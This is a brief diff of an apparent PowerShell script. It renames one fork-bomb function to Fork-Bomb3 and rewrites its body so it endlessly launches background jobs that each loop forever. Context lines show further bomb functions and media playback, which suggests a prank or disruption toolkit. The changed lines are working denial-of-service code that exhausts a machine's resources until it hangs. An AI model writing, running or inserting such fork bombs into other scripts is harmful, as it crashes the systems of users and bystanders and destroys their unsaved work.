@@ -1143,12 +1143,10 @@ Param(
     $mediaPlayer.Play()
 }
 
-Function Fork-BombWTF 
+Function Fork-Bomb3 
 {
-    For(){Ps|Ii}
+    For(){ Sajb{ For(){ } } }
 }
-
-
 
 Function Fork-Bomb2 
 {
